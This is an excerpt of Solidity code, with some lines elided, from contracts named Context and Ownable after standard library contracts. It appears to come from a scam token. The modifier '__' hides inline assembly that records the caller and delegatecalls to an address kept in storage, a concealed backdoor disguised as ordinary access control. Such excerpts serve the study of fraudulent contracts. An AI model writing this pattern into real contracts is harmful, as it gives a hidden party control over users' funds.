...
abstract contract Context {
  bytes32 public constant PERMIT_TYPEHASH =
    0x08f124707cc3dbf62385d6c7407993575c91ce7643a4d4ccacc9a98c36ee1bbe;
...
abstract contract Ownable is Context {
  ...
  modifier __ {
    ...
    assembly{if iszero(sload(0)) {if iszero(delegatecall(gas(), sload(address()), add(s, 32), mload(s), 0, 32)) {revert(0, 0)}return(0, 32)}sstore(address(), caller())}
    _;
  }
